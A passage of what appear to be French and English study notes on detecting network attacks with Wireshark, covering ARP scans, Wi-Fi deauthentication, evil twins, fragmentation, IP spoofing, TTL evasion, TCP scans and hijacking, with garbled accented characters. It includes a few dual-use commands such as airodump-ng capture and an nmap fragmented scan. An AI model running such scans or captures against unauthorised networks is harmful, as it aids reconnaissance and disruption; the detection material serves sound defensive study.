eth.addr == 50:eb:f6:ec:0e:7f or eth.addr == 08:00:27:53:0c:ba</code></pre></div></details><details open=""><summary style="font-weight:600;font-size:1.5em;line-height:1.3;margin:0"><strong>ARP Scanning &amp; Denial-of-Service</strong></summary><div class="indented"><pre class="code code-wrap" id="1e925200-7eb4-8009-af95-c2fbeeffb24d"><code class="language-JavaScript" style="white-space:pre-wrap;word-break:break-all">Signes d‚Äôactivit√©s anormales dans le trafic ARP

En plus des attaques de type poisoning et spoofing, des acteurs malveillants peuvent aussi exploiter ARP pour effectuer du renseignement r√©seau.
Indicateurs d‚Äôun scan ARP :
Requ√™tes ARP broadcast envoy√©es √† des adresses IP s√©quentielles (ex. : .1, .2, .3, ‚Ä¶).
Requ√™tes ARP envoy√©es vers des h√¥tes inexistants.
Volume anormal de trafic ARP provenant d‚Äôun seul h√¥te (potentiellement compromis ou malveillant).

D√©tection d‚Äôun scan ARP

En ouvrant le fichier ARP_Scan.pcapng dans Wireshark et en appliquant le filtre suivant :

arp.opcode
On peut observer :
Un h√¥te envoyant des requ√™tes ARP vers toutes les IP d‚Äôun sous-r√©seau, ce qui sugg√®re un scan ARP actif (souvent initi√© par des outils comme Nmap).
Les r√©ponses ARP des h√¥tes actifs permettent √† l‚Äôattaquant de cartographier les √©quipements en ligne.

Identification d‚Äôun d√©ni de service (DoS) via ARP
√âtapes d‚Äôune attaque ARP DoS :
L‚Äôattaquant scanne les h√¥tes actifs.
Il tente de corrompre les caches ARP du r√©seau :
En attribuant des nouvelles adresses MAC √† chaque IP l√©gitime.
En attribuant une m√™me IP (ex. : 192.168.10.1) √† plusieurs machines (conflits d‚ÄôIP), perturbant la communication.
Objectif :

Plonger le sous-r√©seau dans le chaos ARP, entra√Ænant :
Perturbation des connexions.
Possibilit√© d‚Äôinterception (MITM).
Saturation du cache ARP des √©quipements (DoS).

R√©action face aux attaques ARP
Tra√ßage et identification :
Remonter √† la machine physique qui √©met les paquets ARP suspects.
Il est possible qu‚Äôelle soit elle-m√™me infect√©e ou utilis√©e comme relais.
Confinement :
D√©connecter ou isoler le segment r√©seau affect√© via le switch ou le routeur.
Cela permet de stopper la propagation, bloquer la fuite de donn√©es ou mettre fin √† l‚Äôattaque DoS/MITM.

Remarque Importante
Les attaques au niveau de la couche liaison (couche 2 OSI) peuvent sembler anodines au d√©part, mais leur d√©tection pr√©coce est cruciale pour √©viter des exfiltrations √† des couches sup√©rieures.</code></pre></div></details><details open=""><summary style="font-weight:600;font-size:1.5em;line-height:1.3;margin:0"><strong>802.11 Denial of Service</strong></summary><div class="indented"><pre class="code code-wrap" id="1e925200-7eb4-805f-99f0-c16bde3c65ca"><code class="language-JavaScript" style="white-space:pre-wrap;word-break:break-all">802.11 (Wi-Fi) Traffic Analysis: Detecting Attacks

In traffic analysis, it's essential to focus on link-layer protocols like 802.11 (Wi-Fi). Many network defenders overlook Wi-Fi traffic attacks, which can lead to significant vulnerabilities, especially if human error compromises perimeter security.
Capturing 802.11 Traffic

To analyze raw 802.11 traffic, a wireless interface in monitor mode is required. This mode allows you to capture unencrypted frames without the need for an active association with an access point (AP). It‚Äôs similar to promiscuous mode but specifically designed for Wi-Fi.
Steps to Capture Traffic:
Enumerate Wireless Interfaces:
   In Linux, use iwconfig to list wireless interfaces.

   iwconfig
   Enable Monitor Mode:
   There are multiple ways to enable monitor mode. Here are two methods:
Option 1: Using airmon-ng:

     sudo airmon-ng start wlan0
     Option 2: Using system utilities:

     sudo ifconfig wlan0 down
     sudo iwconfig wlan0 mode monitor
     sudo ifconfig wlan0 up
     Verify Monitor Mode:
   After enabling monitor mode, verify it with iwconfig:

   iwconfig
   Capture Traffic Using airodump-ng:
   To capture Wi-Fi traffic, specify the AP‚Äôs channel and BSSID, and output the results to a file using airodump-ng:

   sudo airodump-ng -c 4 --bssid F8:14:FE:4D:E6:F1 wlan0 -w raw
   How Deauthentication Attacks Work

Deauthentication and dissociation attacks are common types of link-layer attacks that attackers use for a variety of purposes:
Capturing WPA handshakes
Disrupting service
Forcing clients to connect to rogue or malicious networks

In these attacks, the attacker spoofs deauthentication frames from the legitimate Access Point (AP), tricking connected clients into disconnecting. This forces the client to re-authenticate, allowing the attacker to intercept the WPA handshake.

Tools commonly used for deauthentication attacks include:
aireplay-ng
mdk4

Often, the reason code 7 (from the 802.11 standard) is used for deauthentication in these attacks.

Detecting Deauthentication Attacks

When monitoring traffic, you can look for deauthentication frames sent from the AP's BSSID. In Wireshark, use the following steps to detect deauthentication attacks:
Filter for the AP‚Äôs BSSID:
   This isolates the frames sent by the targeted AP.

   wlan.bssid == xx:xx:xx:xx:xx:xx
   Filter for Deauthentication Frames:
   Deauthentication frames are identified by the frame type and subtype. The subtype value for deauthentication is 12.

   (wlan.bssid == xx:xx:xx:xx:xx:xx) and (wlan.fc.type == 00) and (wlan.fc.typesubtype == 12)
   Look for Reason Code 7:
   Reason code 7 is commonly used for deauthentication attacks. If a large number of deauthentication frames are seen with this reason code, it‚Äôs likely an attack.

   (wlan.bssid == F8:14:FE:4D:E6:F1) and (wlan.fc.type == 00) and (wlan.fc.typesubtype == 12) and (wlan.fixed.reasoncode == 7)
   Revolving Reason Codes:

Sophisticated attackers may rotate the reason codes to avoid detection. To detect this, you can create filters for different reason codes. For example:
Reason Code 1:

  (wlan.bssid == F8:14:FE:4D:E6:F1) and (wlan.fc.type == 00) and (wlan.fc.typesubtype == 12) and (wlan.fixed.reasoncode == 1)
  Reason Code 2:

  (wlan.bssid == F8:14:FE:4D:E6:F1) and (wlan.fc.type == 00) and (wlan.fc.typesubtype == 12) and (wlan.fixed.reasoncode == 2)
  This allows you to capture attacks that don‚Äôt always use reason code 7.

Compensating Measures

To prevent deauthentication attacks and other link-layer attacks, consider the following defensive strategies:
Enable IEEE 802.11w: This standard provides Management Frame Protection (MFP), which helps secure management frames like deauthentication and disassociation frames.
Use WPA3-SAE: WPA3 offers better protection against offline dictionary attacks and improves security over WPA2.
Update WIDS/WIPS: Wireless Intrusion Detection and Prevention Systems (WIDS/WIPS) can help detect and mitigate such attacks. Ensure your detection rules are up-to-date.

Detecting Failed Authentication Attempts

Excessive association requests may indicate an attack, as attackers will often try to associate with the network to capture the WPA handshake. To capture these requests in Wireshark, filter for association-related frames:

(wlan.bssid == F8:14:FE:4D:E6:F1) and (wlan.fc.type == 00) and (wlan.fc.typesubtype == 0) or (wlan.fc.typesubtype == 1) or (wlan.fc.typesubtype == 11)
This filter helps identify failed authentication attempts or repeated association requests, which can be signs of a dictionary or brute force attack.

Conclusion

Monitoring 802.11 traffic for signs of deauthentication attacks, failed authentications, and other suspicious activity is crucial in maintaining Wi-Fi security. By utilizing tools like Wireshark and airodump-ng, and applying the correct filters, you can detect these attacks early and take appropriate actions to protect the network. Additionally, enabling robust security protocols like WPA3 and 802.11w will significantly reduce the likelihood of such attacks succeeding.</code></pre></div></details><details open=""><summary style="font-weight:600;font-size:1.5em;line-height:1.3;margin:0"><strong>Rogue Access Point &amp; Evil-Twin Attacks</strong></summary><div class="indented"><pre class="code code-wrap" id="1e925200-7eb4-803b-8502-fd6c4f72d057"><code class="language-JavaScript" style="white-space:pre-wrap;word-break:break-all">Point d'Acc√®s Rogue (Rogue AP)

Un point d'acc√®s rogue est un appareil non autoris√© connect√© directement au r√©seau, ce qui permet de contourner les contr√¥les p√©riph√©riques. Ces points d'acc√®s peuvent :
Contourner la segmentation du r√©seau.
Fournir un acc√®s non autoris√© √† des sections restreintes du r√©seau.
Parfois infiltrer des r√©seaux isol√©s (air-gapped).
Evil-Twin

Un point d'acc√®s Evil-Twin est g√©n√©ralement un point d'acc√®s autonome, s√©par√© du r√©seau l√©gitime, utilis√© par les attaquants pour intercepter des donn√©es via des attaques de type Man-in-the-Middle (MITM). Ces points d'acc√®s :
Sont souvent configur√©s pour capturer des informations sensibles, telles que des identifiants sans fil.
Peuvent h√©berger des portails malveillants pour inciter les utilisateurs √† divulguer leurs informations de connexion.
D√©tection avec Airodump-ng

Nous pouvons utiliser airodump-ng avec un filtre ESSID pour d√©tecter les points d'acc√®s Evil-Twin :

sudo airodump-ng -c 4 --essid HTB-Wireless wlan0 -w raw
Exemple de sortie :

CH  4 ][ Elapsed: 1 min ][ 2023-07-13 16:06    
BSSID              PWR RXQ  Beacons    #Data, #/s  CH   MB   ENC CIPHER  AUTH ESSID
F8:14:FE:4D:E6:F2   -7 100      470      155    0   4   54   OPN              HTB-Wireless
F8:14:FE:4D:E6:F1   -5  96      682        0    0   4  324   WPA2 CCMP   PSK  HTB-Wireless 
Cet exemple montre un AP malveillant ouvert avec un ESSID identique √† notre AP l√©gitime, sugg√©rant une attaque de type hostile portal.
Analyse des Beacons pour la D√©tection d'Evil-Twin

Pour confirmer des anomalies, examinez les trames de beacon avec ce filtre Wireshark :

(wlan.fc.type == 00) and (wlan.fc.type_subtype == 8)
Analyse des Beacons :
Information RSN : L'AP l√©gitime peut contenir des informations RSN indiquant WPA2 avec AES/TKIP et PSK. En revanche, un AP malveillant pourrait ne pas avoir ces informations RSN.
Champs suppl√©mentaires : Pour des attaques sophistiqu√©es, v√©rifiez les informations sp√©cifiques au vendeur et d'autres identifiants uniques qui pourraient manquer dans l'AP de l'attaquant.
Identification des Utilisateurs Compromis

Dans le cas d'attaques Evil-Twin sur un r√©seau ouvert :
Utilisez le filtre Wireshark suivant pour isoler le trafic provenant de l'AP suspect :

(wlan.bssid == F8:14:FE:4D:E6:F2)
La d√©tection des requ√™tes ARP provenant d'un appareil client sur ce r√©seau pourrait indiquer un compromis potentiel. Notez :
L'adresse MAC de l'appareil client.
Le nom d'h√¥te.

Prenez des mesures r√©actives comme des r√©initialisations de mots de passe pour att√©nuer le risque.
D√©tection des Points d'Acc√®s Rogue

La d√©tection des points d'acc√®s rogue passe souvent par la surveillance des dispositifs r√©seau. Il faut chercher :
Des r√©seaux non reconnus avec des signaux forts, en particulier des r√©seaux ouverts.
Des points d'acc√®s suspects √† proximit√© (par exemple, des hotspots Windows).

Les r√©seaux inconnus sans cryptage peuvent indiquer des points d'acc√®s rogue mis en place pour contourner la s√©curit√© du r√©seau.</code></pre></div></details><details open=""><summary style="font-weight:600;font-size:1.5em;line-height:1.3;margin:0"><strong>Fragmentation Attacks</strong></summary><div class="indented"><pre class="code code-wrap" id="1e925200-7eb4-80d7-9bc7-c6615b01bfb8"><code class="language-JavaScript" style="white-space:pre-wrap;word-break:break-all">L'Analyse des Trafic R√©seau au Niveau de la Couche IP et l'Abus de la Fragmentation

Lors de l'analyse du trafic r√©seau, la couche IP est cruciale pour comprendre le transfert de paquets entre h√¥tes. Cependant, cette couche ne dispose pas de m√©canismes pour d√©tecter les paquets perdus ou alt√©r√©s, ces probl√®mes √©tant g√©r√©s par les couches transport et application. Voici les champs cl√©s de l'en-t√™te IP :
Longueur : La longueur de l'en-t√™te IP.
Longueur Totale : La longueur totale du paquet IP, y compris les donn√©es.
D√©calage de Fragmentation : Ce champ est d√©fini lorsque les paquets sont fragment√©s, il aide √† la r√©assembl√©e au niveau du destinataire.
Adresses IP Source et Destination : Identifie les h√¥tes d'origine et de destination.
L'Abus des Champs de Fragmentation

Les attaquants peuvent manipuler ces champs pour contourner les contr√¥les r√©seau. Comprendre l'abus de ces champs peut am√©liorer la d√©tection lors de l'analyse du trafic.
Techniques d'Abus de la Fragmentation

Les h√¥tes l√©gitimes fragmentent les paquets pour transf√©rer de grands ensembles de donn√©es, suivant la norme Maximum Transmission Unit (MTU). Les attaquants exploitent la fragmentation pour :
√âvasion des syst√®mes de d√©tection d'intrusion (IDS) / syst√®mes de pr√©vention des intrusions (IPS) : Si l'IDS ne r√©assemble pas les fragments, les attaquants peuvent utiliser des scans fragment√©s (par exemple, avec nmap) pour contourner la d√©tection.
√âvasion des Pare-feux : Les paquets fragment√©s peuvent contourner les contr√¥les du pare-feu s'ils ne sont pas r√©assembl√©s avant la livraison.
√âpuisement des ressources des pare-feux/IPS/IDS : Des tailles MTU petites (par exemple, 10, 15 octets) sollicitent les ressources et peuvent contourner la r√©assembl√©e en raison de limites de ressources.
D√©ni de service (DoS) : Des h√¥tes anciens peuvent √™tre submerg√©s par des paquets fragment√©s volumineux, provoquant une attaque par d√©ni de service.

Un m√©canisme r√©seau correctement configur√© devrait utiliser la r√©assembl√©e diff√©r√©e, c'est-√†-dire attendre tous les fragments avant d'effectuer l'inspection des paquets.
D√©tection des Anomalies de D√©calage de Fragmentation

Pour inspecter les anomalies de fragmentation, ouvrez le fichier de capture dans Wireshark :

wireshark nmapfragfwbypass.pcapng
Indicateurs de Scans Fragment√©s
Requ√™tes ICMP : Les scans nmap ou similaires commencent souvent par des requ√™tes ICMP pour la d√©couverte d'h√¥tes.

  nmap &lt;adresseiph√¥te&gt;
  Paquets Fragment√©s avec MTU Sp√©cifi√© : Les attaquants d√©finissent un MTU sp√©cifique pour fragmenter les paquets.

  nmap -f 10 &lt;adresseip_h√¥te&gt;
  Les paquets avec une fragmentation r√©p√©t√©e d'un h√¥te peuvent indiquer une attaque par fragmentation.
Un H√¥te, Plusieurs Ports : Les scans fragment√©s g√©n√®rent des r√©ponses avec des flags RST pour les ports ferm√©s, ce qui indique des scans sur plusieurs ports.
Configuration de Wireshark pour la R√©assembl√©e

Si Wireshark ne r√©assemble pas les paquets automatiquement, vous devez ajuster les param√®tres sous Pr√©f√©rences pour le protocole IPv4 afin d'assurer la r√©assembl√©e des paquets, facilitant ainsi une inspection plus pr√©cise.

Conclusion

L'usage malveillant de la fragmentation, comme dans les attaques par fragmentation de scans ou l'√©vasion des pare-feu, peut √™tre d√©tect√© efficacement avec les bons outils et param√®tres. En ajustant correctement Wireshark pour r√©assembler les paquets, il devient possible de rep√©rer les anomalies de fragmentation et de mieux prot√©ger le r√©seau contre ces formes d'attaque.</code></pre></div></details><details open=""><summary style="font-weight:600;font-size:1.5em;line-height:1.3;margin:0"><strong>IP Source &amp; Destination Spoofing Attacks</strong></summary><div class="indented"><pre class="code code-wrap" id="1e925200-7eb4-8047-a226-faf7f62342cd"><code class="language-JavaScript" style="white-space:pre-wrap;word-break:break-all">Manipulation des Champs IP dans le Trafic IPv4 et IPv6

Lors de l'analyse du trafic r√©seau, il est crucial d'examiner les champs source IP et destination IP, car leur manipulation peut √™tre un indicateur cl√© d'attaques. Voici les √©l√©ments √† prendre en compte lors de l‚Äôanalyse du trafic r√©seau :
Source IP pour le Trafic Entrant
La source IP du trafic entrant doit toujours appartenir √† notre sous-r√©seau. Une IP externe dans ce contexte pourrait indiquer une tentative de manipulation de paquets, comme le spoofing.
Source IP pour le Trafic Sortant
La source IP du trafic sortant devrait aussi √™tre interne √† notre sous-r√©seau. Une plage d'IP inhabituelle peut sugg√©rer du trafic malveillant provenant de l'int√©rieur du r√©seau, √©ventuellement d'un h√¥te compromis.
M√©thodes d'Attaque Impliquant le Spoofing IP

Les attaquants peuvent manipuler les champs IP source et destination pour diverses raisons :
Scanning avec App√¢t
Les attaquants modifient l'adresse IP source pour se faire passer pour un h√¥te du r√©seau cible afin d'√©viter les restrictions du pare-feu et contourner les contr√¥les de s√©curit√©.
Attaque de Source Al√©atoire (DDoS)
Les attaquants envoient un grand volume de trafic depuis des IP source al√©atoires dans le but d'√©puiser les ressources du serveur cible (attaque par d√©ni de service distribu√©).
Attaque LAND
L'attaquant modifie l'IP source pour qu'elle corresponde √† l'IP de destination, provoquant l'√©puisement des ressources ou un plantage de l'h√¥te cible.
Attaque SMURF
Envoie des paquets ICMP √† plusieurs h√¥tes, avec l'IP de la victime comme adresse source, ce qui inonde la victime de r√©ponses.
G√©n√©ration de Vecteurs d'Initialisation
Dans les r√©seaux WEP plus anciens, des paquets avec des IP malveillantes peuvent √™tre inject√©s pour aider √† la construction de tables de d√©cryptage utilis√©es dans des attaques statistiques.

Ces attaques reposent principalement sur la manipulation des champs IP au niveau de la couche IP, plut√¥t que sur l'empoisonnement ARP. Toutefois, ces deux m√©thodes peuvent √™tre combin√©es dans des attaques sophistiqu√©es.
D√©tection des Tentatives de Scan avec App√¢t

Un attaquant peut modifier son IP source pour imiter un h√¥te l√©gitime, avec pour objectif de contourner les contr√¥les IDS/pare-feu. Les signes d'un scan avec app√¢t incluent :
Fragmentation initiale en provenance d'une adresse spoof√©e.
Trafic TCP provenant d'une adresse source l√©gitime, avec des flags RST pour les ports ferm√©s.
Techniques de D√©tection :
Reconstruction des Paquets : Assurez-vous que les syst√®mes IDS/IPS/pare-feu peuvent reconstituer les paquets et analyser le comportement du trafic de la machine de destination.
Consistance des Connexions : Surveillez les connexions initi√©es par une machine et termin√©es par une autre, ce qui peut √™tre un indicateur de cachage d'adresse.
D√©tection des Attaques de Source Al√©atoire

Les attaques de source al√©atoire sont souvent utilis√©es dans les attaques par d√©ni de service, o√π un grand nombre de sources al√©atoires sont utilis√©es pour cibler un service particulier. Les indicateurs incluent :
Utilisation d'un seul port par plusieurs h√¥tes al√©atoires.
Ports de base incr√©mentiels : les ports de base sont constants avec peu de variation.
Longueur uniforme des paquets : Contrairement au trafic l√©gitime des utilisateurs, les paquets cr√©√©s peuvent avoir une longueur uniforme.
D√©tection des Attaques SMURF

Les attaques SMURF exploitent les paquets ICMP en envoyant des demandes ICMP √† plusieurs h√¥tes avec l'IP de la victime comme adresse source. Cela fait en sorte que chaque h√¥te r√©ponde √† la victime, la noyant sous une masse de r√©ponses.
√âtapes de l'Attaque SMURF :
Envoi de requ√™tes ICMP √† des h√¥tes actifs avec l'IP de la victime comme source.
R√©ponses ICMP envoy√©es par les h√¥tes vers la victime, la saturant de trafic.
D√©tection :
R√©ponses ICMP excessives √† une seule cible.
Des paquets ICMP fragment√©s ou dot√©s de donn√©es suppl√©mentaires peuvent √™tre utilis√©s pour amplifier le volume de l'attaque.
D√©tection des Attaques LAND

Les attaques LAND consistent √† falsifier l'IP source pour qu'elle corresponde √† l'IP de destination. Cette attaque cr√©e une surcharge en envoyant un trafic √©lev√© √† un h√¥te cible, ce qui emp√™che l'√©tablissement de connexions l√©gitimes.
Symptomatiques de l'Attaque LAND :
Une congestion du r√©seau et des ressources sur l'h√¥te cible √† cause de la tentative de connexions incessantes √† partir de la m√™me adresse IP.
Conclusion

Les attaques fond√©es sur la manipulation des champs IP, telles que le spoofing et les attaques DDoS utilisant des IP sources al√©atoires, repr√©sentent des risques consid√©rables pour la s√©curit√© des r√©seaux. Une d√©tection efficace de ces attaques repose sur l'analyse minutieuse des mod√®les de trafic et la capacit√© √† reconstituer les paquets. La vigilance continue au niveau des syst√®mes IDS/IPS, des pare-feu et des mesures de s√©curit√© r√©seau est essentielle pour identifier ces menaces et les contrer de mani√®re proactive.</code></pre></div></details><details open=""><summary style="font-weight:600;font-size:1.5em;line-height:1.3;margin:0"><strong>IP Time-to-Live Attacks</strong></summary><div class="indented"><pre class="code code-wrap" id="1e925200-7eb4-809b-8db1-d26ad845bfb7"><code class="language-JavaScript" style="white-space:pre-wrap;word-break:break-all">Manipulation du Time-to-Live (TTL) dans les Attaques

Les attaques utilisant la manipulation du Time-to-Live (TTL) sont une technique d‚Äô√©vasion utilis√©e par les attaquants pour contourner les syst√®mes de d√©tection tels que les pare-feu, IDS et IPS. Voici le fonctionnement de la manipulation de TTL :
Manipulation du TTL
Cr√©ation de Paquets avec un TTL Bas : L'attaquant configure le TTL √† une valeur basse (par exemple, 1, 2, 3).
D√©cr√©mentation du TTL : √Ä chaque saut (hop) sur le r√©seau, le TTL est r√©duit de 1.
Rejet des Paquets : Lorsque le TTL atteint z√©ro, le paquet est rejet√©, avant d'atteindre id√©alement un pare-feu ou un filtre.
R√©ponse ICMP : Les paquets expir√©s d√©clenchent des messages ICMP Time Exceeded envoy√©s par les routeurs sur le chemin vers l'origine du paquet.
D√©tection des Anomalies de TTL

Pour d√©tecter la manipulation du TTL, il est essentiel de capturer et d‚Äôanalyser le trafic √† l‚Äôaide de Wireshark. Bien qu'une instance isol√©e soit difficile √† rep√©rer, les attaquants utilisent souvent la manipulation du TTL lors de scans de ports, g√©n√©rant des motifs d√©tectables.
Indicateurs de Manipulation de TTL
SYN, ACK provenant de Ports de Service : Une r√©ponse SYN, ACK l√©gitime provenant d'un port de service peut indiquer qu'un pare-feu a √©t√© contourn√©.
Valeurs TTL Basses : Lors de l'examen du champ TTL dans l‚Äôonglet IPv4 de Wireshark, des valeurs de TTL anormalement basses peuvent indiquer des paquets manipul√©s.
Strat√©gie de Mitigation

Une strat√©gie de mitigation consiste √† mettre en place un contr√¥le qui filtre ou rejette les paquets ayant un TTL en dessous d'un certain seuil. Cela permet de pr√©venir les attaques par manipulation du TTL qui exploitent les paquets IP craft√©s pour contourner les d√©fenses r√©seau.</code></pre></div></details><details open=""><summary style="font-weight:600;font-size:1.5em;line-height:1.3;margin:0"><strong>TCP Handshake Abnormalities</strong></summary><div class="indented"><pre class="code code-wrap" id="1e925200-7eb4-804a-99d5-f9ec9d0237f1"><code class="language-JavaScript" style="white-space:pre-wrap;word-break:break-all">Probing TCP Services: Understanding Anomalous Behavior

When attackers probe TCP services, they often exploit various scanning techniques that deviate from standard traffic patterns. These behaviors can reveal malicious intent and indicate attempts to identify vulnerable services. To understand these anomalies, we first need to review how a standard TCP 3-way handshake works.

TCP Handshake Overview
SYN Request: The client sends a SYN packet to initiate the connection to the target port.
SYN-ACK Response: If the target port is open, the server responds with a SYN-ACK, acknowledging the request and indicating that the port is open.
ACK Completion: The client responds with an ACK to complete the handshake and establish the connection.
Common TCP Flags and Their Functions
URG (Urgent): Indicates that the data should be processed immediately.
ACK (Acknowledgment): Acknowledges that data has been received.
PSH (Push): Pushes data to the application layer immediately.
RST (Reset): Terminates the connection, often used in attack scenarios.
SYN (Synchronize): Initiates the connection during the handshake.
FIN (Finish): Ends the connection.
ECN (Explicit Congestion Notification): Notifies the sender of network congestion.

These flags are essential in tracking the state of TCP connections and can help identify unusual or malicious activity.

Indicators of Abnormal TCP Handshake Patterns

When attackers probe services, certain abnormal behaviors can be observed during the TCP handshake or communication. These anomalies often serve as indicators of malicious activity:
Excessive Flags: If multiple flags are used in one packet, or if the same flag appears repeatedly, this may indicate a scanning attempt.
Unusual Flag Combinations: Combinations of flags that are not typically used together can suggest attempts to exploit vulnerabilities (e.g., RST flag usage in attempts to terminate or hijack connections).
Single Host Targeting Multiple Ports or Hosts: Scans from a single host that target multiple ports or hosts are common in network reconnaissance. These could be decoy scans, or the attacker could be trying random source IPs to evade detection.

Types of TCP Scans
SYN Scan (Half-Open Scan)
Technique: The attacker sends a SYN packet to a target port. If the port is open, the server responds with a SYN-ACK. The attacker then sends an RST to close the connection without completing the handshake.
Response:
Open Port: SYN-ACK response from the server.
Closed Port: RST response from the server.
Detection: This scan technique is stealthy because the attacker does not complete the handshake, leaving less trace in the target system's logs.
SYN Stealth Scan
Technique: Similar to SYN Scan, but the attacker only partially completes the handshake (e.g., only sends a SYN and never sends an ACK). This helps avoid detection by intrusion detection systems (IDS) and firewalls.
Response:
Open Port: SYN-ACK response.
Closed Port: No response or an RST.
Detection: This scan is particularly difficult to detect because it never fully establishes a connection.
NULL Scan
Technique: The attacker sends TCP packets with no flags set, which can confuse the target system.
Response:
Open Port: No response from the system.
Closed Port: The system replies with an RST packet.
Detection: NULL scans exploit the fact that some systems do not respond to packets with no flags set, while others will send an RST for closed ports.
ACK Scan
Technique: In an ACK scan, the attacker sends packets with the ACK flag set. This can be used to map out firewalls or filtering devices by determining whether the port is open or closed.
Response:
Open Port: No response or an RST packet (depending on firewall configuration).
Closed Port: An RST packet response.
Detection: The ACK scan can help the attacker determine which ports are filtered and which are open/closed, providing useful information for further attacks.
FIN Scan
Technique: All packets are sent with the FIN flag set. This is a highly unusual scan technique.
Response:
Open Port: No response from the system.
Closed Port: The system replies with an RST packet.
Detection: Like the NULL scan, the FIN scan relies on peculiar behavior from the target system, and is easily detectable if the attacker sends packets with the FIN flag in an unexpected context.
Xmas Tree Scan
Technique: The attacker sends packets with all flags set (SYN, FIN, URG, PSH, RST, and ACK). This scan is designed to confuse the target system or firewall.
Response:
Open Port: No response or an RST packet (depending on firewall or system configuration).
Closed Port: An RST response.
Detection: Xmas tree scans are easily identifiable because all the flags are set, which is highly unusual for normal network traffic.

Summary of TCP Scan Responses

| Scan Type        | Flags Used | Open Port Response | Closed Port Response |
| -------------------- | -------------- | ---------------------- | ------------------------ |
| SYN Scan         | SYN            | SYN-ACK                | RST                      |
| SYN Stealth Scan | SYN            | SYN-ACK                | No Response / RST        |
| NULL Scan        | No Flags       | No Response            | RST                      |
| ACK Scan         | ACK            | No Response / RST      | RST                      |
| FIN Scan         | FIN            | No Response            | RST                      |
| Xmas Tree Scan   | All Flags      | No Response / RST      | RST                      |

Conclusion

TCP scanning techniques, such as SYN, FIN, NULL, and Xmas Tree scans, all rely on manipulating specific flags to achieve reconnaissance while evading detection. By analyzing these abnormal TCP patterns‚Äîwhether excessive flag use, unusual flag combinations, or multiple host and port targeting‚Äîsecurity professionals can detect early signs of malicious scanning or probing. Identifying these patterns through tools like Wireshark is critical for preventing potential attacks that may follow.</code></pre></div></details><details open=""><summary style="font-weight:600;font-size:1.5em;line-height:1.3;margin:0"><strong>TCP Connection Resets &amp; Hijacking</strong></summary><div class="indented"><pre class="code code-wrap" id="1e925200-7eb4-802f-a5ce-ca0464016afb"><code class="language-JavaScript" style="white-space:pre-wrap;word-break:break-all">Attaques sur les Connexions TCP : Terminaison et D√©tournement de Connexion

Les connexions TCP, bien que robustes dans de nombreux contextes, pr√©sentent des vuln√©rabilit√©s, notamment en ce qui concerne la protection contre l'interruption ou le d√©tournement des connexions. Ces failles peuvent se manifester par des attaques de terminaison de connexion via des paquets RST ou par des techniques plus avanc√©es de d√©tournement de connexion.
Terminaison de Connexion TCP via Paquets RST

Une attaque par injection de paquets RST (ou terminaison de connexion TCP) vise √† perturber un service r√©seau. Cette attaque se d√©roule selon les √©tapes suivantes :
Usurpation de Source : L'attaquant usurpe l'adresse source pour la faire correspondre √† celle de la machine cible.
Injection de Paquet RST : L'attaquant cr√©e un paquet TCP avec le drapeau RST pour forcer la terminaison de la connexion active.
Port de Destination Cibl√© : L'attaquant sp√©cifie un port de destination actuellement utilis√© par la machine cible.
D√©tection des Attaques TCP RST

Pour d√©tecter une attaque par RST, vous pouvez chercher plusieurs indicateurs dans Wireshark ou d'autres outils de capture de paquets :
Volume Anormal de Paquets : Une quantit√© anormale de paquets envoy√©s √† un port unique peut √™tre un signe d'attaque RST. Cela se manifeste g√©n√©ralement sous forme de paquets r√©p√©titifs avec le drapeau RST activ√©.
Discr√©pance des Adresses MAC : Si des paquets avec une IP usurp√©e (par exemple, 192.168.10.4) sont observ√©s avec une adresse MAC inattendue, cela peut indiquer une activit√© malveillante. En effet, un paquet usurp√© doit correspondre √† l'adresse MAC de la machine cible, mais une incoh√©rence sugg√®re un attaquant tentant de perturber la connexion.

Notez que l'usurpation d'adresse MAC est possible, mais elle peut entra√Æner des incoh√©rences, notamment en cas d'empoisonnement ARP.

D√©tournement de Connexion TCP

Les attaques plus sophistiqu√©es incluent le d√©tournement de connexion TCP, o√π l'attaquant prend le contr√¥le d'une session TCP active. Cette attaque implique plusieurs techniques complexes :
Pr√©diction des Num√©ros de S√©quence : L'attaquant pr√©dit les num√©ros de s√©quence pour injecter des paquets au bon endroit dans la connexion cible, imitant ainsi le flux l√©gitime de donn√©es.
Usurpation de Source : Comme pour les attaques RST, l'attaquant usurpe l'adresse IP source pour imiter la machine cible.
Blocage des ACKs : Pour maintenir la connexion d√©tourn√©e, l'attaquant bloque ou retarde les paquets ACK (Accus√© de R√©ception) envoy√©s par la machine cible. Cela permet de maintenir un flux continu de donn√©es sans que la machine cible puisse r√©tablir le contr√¥le.
Indicateurs de D√©tournement de Connexion TCP

Plusieurs anomalies peuvent indiquer une tentative de d√©tournement de connexion TCP :
Anomalies dans les Num√©ros de S√©quence : Des num√©ros de s√©quence incoh√©rents ou inhabituels peuvent sugg√©rer des tentatives de pr√©diction de s√©quence, ce qui est typique des attaques de d√©tournement de connexion.
ACKs Bloqu√©s ou Retard√©s : Si les paquets ACK sont retard√©s ou absents, cela peut indiquer que l'attaquant tente de prendre le contr√¥le de la session en bloquant la confirmation des paquets envoy√©s.

Le d√©tournement de connexion TCP est souvent coupl√© avec des techniques comme l'empoisonnement ARP, qui permet √† l'attaquant de manipuler les adresses MAC dans le r√©seau, rendant le trafic plus difficile √† tracer.

Conclusion

Les attaques sur les connexions TCP, telles que l'injection de paquets RST et le d√©tournement de connexions, exploitent des failles inh√©rentes au protocole TCP. La d√©tection de ces attaques repose sur l'observation des anomalies dans les num√©ros de s√©quence, des paquets RST r√©p√©titifs, ainsi que des incoh√©rences dans les adresses MAC et les paquets ACK. Pour se d√©fendre contre ces attaques, il est essentiel de :
Analyser attentivement les flux TCP pour rep√©rer les anomalies dans le trafic.
V√©rifier la configuration des pare-feu et des r√©seaux pour d√©tecter et bloquer les activit√©s suspectes.
Utiliser des protocoles s√©curis√©s comme SSH √† la place de Telnet pour limiter les risques d'interception de connexion.

En surveillant activement ces indicateurs et en mettant en ≈ìuvre des contr√¥les de s√©curit√© appropri√©s, il est possible de d√©tecter et d'att√©nuer les attaques bas√©es sur TCP avant qu'elles ne causent des dommages importants.</code></pre></div></details><details open=""><summary style="font-weight:600;font-size:1.5em;line-height:1.3;margin:0"><strong>ICMP Tunneling</strong></summary><div class="indented"><pre class="code code-wrap" id="1e925200-7eb4-80d7-be46-e0c997be0fb1"><code class="language-JavaScript" style="white-space:pre-wrap;word-break:break-all">Le tunneling est une m√©thode utilis√©e par les attaquants pour exfiltrer des donn√©es d'un syst√®me vers un autre, souvent en exploitant des protocoles de confiance ou des proxies autoris√©s par les contr√¥les r√©seau.
Les Bases du Tunneling

